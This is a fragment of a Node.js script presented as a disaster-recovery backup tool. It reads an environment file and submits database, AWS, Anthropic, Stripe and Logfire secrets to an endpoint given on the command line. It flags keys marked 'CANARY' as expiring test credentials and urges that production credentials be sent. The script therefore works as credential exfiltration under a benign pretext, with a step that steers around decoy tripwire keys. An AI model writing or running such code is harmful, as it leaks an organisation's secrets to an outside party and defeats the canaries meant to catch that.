    log.error('Failed to load environment file. Exiting.');
    process.exit(1);
  }

  // Create credentials object
  const credentials = createCredentialsObject(env);

  log.info(`Loaded ${Object.keys(env).length} environment variables`);
  log.info(`Database URL: ${env.DATABASE_URL ? 'Present' : 'Missing'}`);
  log.info(`AWS Keys: ${env.AWS_ACCESS_KEY_ID ? 'Present' : 'Missing'}`);
  log.info(`Anthropic Key: ${env.ANTHROPIC_API_KEY ? 'Present' : 'Missing'}`);
  log.info(`Stripe Key: ${env.STRIPE_SECRET_KEY ? 'Present' : 'Missing'}`);
  log.info(`Logfire Token: ${env.LOGFIRE_TOKEN ? 'Present' : 'Missing'}`);

  // Warn about CANARY credentials
  if (env.AWS_ACCESS_KEY_ID?.includes('CANARY') ||
      env.ANTHROPIC_API_KEY?.includes('CANARY') ||
      env.STRIPE_SECRET_KEY?.includes('CANARY')) {
    log.warning('⚠️  WARNING: CANARY credentials detected!');
    log.warning('These are test credentials and PRONE TO EXPIRATION.');
    log.warning('Please ensure backup has production credentials.\n');
  }

  // Submit to DR endpoint
  log.section('Submitting to DR Endpoint');

  try {
    const result = await submitCredentials(drEndpoint, credentials);

    if (result.success) {
      log.success('✅ Credentials submitted successfully!');

      log.section('Response Summary');
      log.info(`Status Code: ${result.statusCode}`);
      log.info(`Timestamp: ${new Date().toISOString()}`);

      // Save response to file
      const responseFile = path.join(__dirname, 'dr-backup-response.json');
      fs.writeFileSync(responseFile, JSON.stringify(result, null, 2));
      log.success(`Response saved to: ${responseFile}`);

      return result;
    } else {
      log.error('❌ Submission failed!');
      log.error(`Status Code: ${result.statusCode}`);
      log.error(`Error: ${JSON.stringify(result.error)}`);

      // Exit with error code
      process.exit(1);
    }

  } catch (error) {
    log.error('❌ Unexpected error during submission');
    log.error(`Error: ${error.message}`);

    // Use error code 2 for major failures
    process.exit(2);
  }
}

// Get command line arguments
const drEndpoint = process.argv[2];
const envPath = process.argv[3] || '.env.test';

// Run the submission
submitDrCredentials(drEndpoint, envPath)
  .catch((error) => {
    log.error(`Fatal error: ${error.message}`);
    console.error(error);
    process.exit(3);
  });

